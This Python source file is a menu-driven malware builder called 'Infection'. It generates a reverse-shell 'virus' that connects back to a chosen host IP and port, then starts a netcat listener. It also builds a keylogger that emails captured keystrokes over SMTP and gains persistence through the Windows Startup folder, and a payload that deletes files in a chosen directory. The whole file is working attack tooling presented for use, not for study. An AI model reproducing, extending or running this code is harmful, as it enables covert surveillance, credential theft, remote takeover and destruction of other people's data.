import shutil
import os
from time import sleep
import subprocess
from pynput.keyboard import Listener
import logging
import platform
import sys
from shutil import copyfile
import threading

def banner():
    print('''\033[31m   ▄█  ███▄▄▄▄      ▄████████    ▄████████  ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███  ███▀▀▀██▄   ███    ███   ███    ███ ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███▌ ███   ███   ███    █▀    ███    █▀  ███    █▀     ▀███▀▀██ ███▌ ███    ███ ███   ███ 
  ███▌ ███   ███  ▄███▄▄▄      ▄███▄▄▄     ███            ███   ▀ ███▌ ███    ███ ███   ███ 
  ███▌ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀     ███            ███     ███▌ ███    ███ ███   ███ 
  ███  ███   ███   ███          ███    █▄  ███    █▄      ███     ███  ███    ███ ███   ███ 
  ███  ███   ███   ███          ███    ███ ███    ███     ███     ███  ███    ███ ███   ███ 
  █▀    ▀█   █▀    ███          ██████████ ████████▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                                                                                          \033[00m  ''')
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(3. / 100)
        threading.Thread()

def virus5(new, file_name32):
    print("\033[31mEnter the Del_file extension, Don't leave it BLANK! (It will be SET To ALL*)\033[00m")
    ess =input("\033[31mInfection\033[01m:~/Deletion/file_extension#\033[00\033[31mm ")
    if ess =="":
        file_name = "*"
    else:
        file_name = ess
    shutil.copy("deletion.py", new)
    with open(new, 'r') as file:
        filedata1 = file.read()
        file_name = "*"
        filedata1 = filedata1.replace("py777", file_name)
        filedata1 = filedata1.replace("path777", file_name32)
    with open(new, "w") as file:
        file.write(filedata1)
    pyinstaller =input("\033[32mDo you wanna make it executable?(1/0): \033[00m")
    if pyinstaller == "1":
        subprocess.call(['pyinstaller '+new],shell=True)
        os.remove(new)
    else:
        exit()

def file_deletion():
    virus = "Deletion"
    file_name4 = input("\033[32mInfection:~/{}/Name# \033[00m".format(virus))
    exten= ".py"
    if file_name4 == "":
        cus = "deletion"
        print("\033[31mSet Deletion_Virus_Name >>> {}\033[00m".format(cus+exten))
        new = cus+exten
    else:
        print("\033[31mSet Deletion_Virus_Name >>> {}\033[00m".format(file_name4+exten))
        new = file_name4+exten
    file_name32 = input("\033[32mInfection:~/{}/del_dir_path# \033[00m".format(virus))
    if file_name32 == "":
        print("\033[31mEnter Valid Path for Deletion!!!\033[00m")
        exit()
    else:
        print("\033[31mSet dir_del >>> {}\033[00m".format(file_name32))
        virus5(new, file_name32)

def smtp():
    email_name =input("\033[32mInfection:~/Keylogger/Name# \033[00m")
    dir_path =input("\033[32mInfection:~/Keylogger/Dir_path# \033[00m")
    email_user =input("\033[32mInfection:~/Keylogger/Email# \033[00m")
    email_password = input("\033[32mInfection:~/Keylogger/Password# \033[00m")
    email_send = input("\033[32mInfection:~/Keylogger/sent_to# \033[00m")
    email_interval = input("\033[32mInfection:~/Keylogger/time_interval# \033[00m")
    join = email_name+".py"
    shutil.copy("logger0.py", join)
    with open(join, 'r') as file:
        filedata1 = file.read()
        filedata1 = filedata1.replace("email_user",email_user)
        filedata1 = filedata1.replace("email_password", email_password)
        filedata1 = filedata1.replace("email_send", email_send)
        filedata1 = filedata1.replace("stokes777", dir_path)
        filedata1 = filedata1.replace("interval", email_interval)
    with open(join, "w") as file:
        file.write(filedata1)
    pyinstaller =input("\033[32mDo you wanna make it executable?(1/0): \033[00m")
    if pyinstaller == "1":
        subprocess.call(['pyinstaller '+join],shell=True)
        os.remove(join)
    else:
        exit()
def keylogger1():
    usr = input("\033[32mDo you wanna connect to SMTP for keys_stokes (1/0): \033[00m")
    if usr == '1':
        smtp()

        #smtp(email_user, email_password, email_send)
    else:
        username = os.getlogin()
        logger = "Keylogger"
        stokes = input("\033[32mInfection:~/{}/key_stokes_path# \033[00m".format(logger))
        try:
            logging_directory = f"/{username}/"+stokes
            logging.basicConfig(filename=f"{logging_directory}/infection_key.txt", level= logging.DEBUG, format= "%(asctime)s: %(message)s")
            print("\033[31m{+} Logger_started...\033[00m")
        except:
            print("\033[31mEnter Valid_path!!\033[00m")
            exit()
        check = platform.system()
        if check == "Windows":
            copyfile("infection_key.txt", f"C/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/file_name.py")
        else:
            def key_handler(key):
                logging.info(key)
            with Listener(on_press=key_handler) as listener:
                listener.join()





def nc(file_name1):
    listener = input("\033[31mDo you wanna start the listener?(1/0): \033[00m")
    #port10 = input("Specify the port number: ")
    if (listener == "1"):
        print("\033[31mStarting netcat...\033[00m")
        sleep(0.7)
        os.system('nc -lvp '+file_name1)
    else:
        exit()
def virus2(file_name1):
    shutil.copy("replicate.py", new)
    extra = file_name1
    with open(new, 'r') as file:
        filedata1 = file.read()
        filedata1 = filedata1.replace("host_ip777", file_name)
        filedata1 = filedata1.replace("host_port777", file_name1)
        filedata1 = filedata1.replace("blackhat777", file_name3)
    with open(new, "w") as file:
        file.write(filedata1)
    pyinstaller =input("\033[32mDo you wanna make it executable?(1/0): \033[00m")
    if pyinstaller == "1":
        os.system('pyinstaller '+new)
        os.remove(new)
        nc(extra)
    else:
        nc(extra)

def custom_malware(file_name1):
    shutil.copy("replicate0.py", new)
    with open(new, 'r') as file:
        filedata1 = file.read()
        filedata1 = filedata1.replace("predator", file_name2)
    with open(new, "w") as file:
        file.write(filedata1)
    pyinstaller =input("\033[32mDo you wanna make it executable?(1/0): \033[00m")
    if pyinstaller == "1":
        subprocess.call(['pyinstaller '+new],shell=True)
        os.remove(new)
        nc(file_name1)
    else:
        nc(file_name1)
os.system("clear")
banner()
slowprint("                      \033[01m\033[33m       >>>- cOdEd By: Predator0x300 -<<<\033[00m\033[00m")
slowprint("              \033[04m\033[33m             >>>--- predator0x300@gmail.com --->>>               \033[00m\033[00m")
slowprint("             \033[01m\033[33m     >>>--- GitHub:\033[31m  https://github.com/Predator0x300 \033[00m\033[33m ---<<<\033[00m\033[00m")
print("\n")

print("\033[93m[1]\033[00m \033[01m\033[31mVIRUS\033[00m\033[00m")
print("\033[93m[2]\033[00m\033[01m \033[31mAdvance_Keylogger\033[00m\033[00m")
print("\033[93m[3]\033[00m \033[01m\033[31mOS_deletion/destruction\033[00m\033[00m")
print("\033[04m\033[33m------\033[00m\033[00m")
#injector = "Custom_malware_injector"
virus = "VIRUS"
usr_in = input("\033[01m\033[95mInfection:~/ \033[00m")
if usr_in == '1':
    file_name4 = input("\033[32mInfection:~/{}/Name# \033[00m".format(virus))
    exten= ".py"
    if file_name4 == "":
        cus = "virus"
        print("\033[31mSet Virus_name >>> {}\033[00m".format(cus+exten))
        new = file_name4+exten
    else:
        print("\033[31mSet Virus_name >>> {}\033[00m".format(file_name4+exten))
        new = file_name4+exten
    file_name = input("\033[32mInfection:~/{}/Host_ip# \033[00m".format(virus))
    print("\033[31mSet Host_ip >>> {}\033[00m".format(file_name))
    file_name1 = input("\033[32mInfection:~/{}/Port# \033[00m".format(virus))
    print("\033[31mSet Listening_Port >>> {}\033[00m".format(file_name1))
    file_name3 = input("\033[32mInfection:~/{}/Optional/Warning_txt# \033[00m".format(virus))
    if file_name3 =="":
        name0 = "Black_Hat@!"
        print(f"\033[31mSet Warning_label >>> {name0}\033[00m")
        file_name3 = "Black_Hat@!"
    else:
        print("\033[31mSet Warning_label >>> {}\033[00m".format(file_name3))
    file_name2 = input("\033[32mInfection:~/{}/Optional/Custom_malware/Paste_Script# (Default nc_shell) \033[00m\n".format(virus))
    if file_name2 =="":
        print("\033[31mSet Custom_malware >>> NULL\033[00m")
        virus2(file_name1)
    else:
        print("\033[31mSet Custom_malware >>> {}\033[00m".format(file_name2))
        custom_malware(file_name1)
elif usr_in == "2":
    keylogger1()
elif usr_in == "3":
    file_deletion()
else:
    exit()






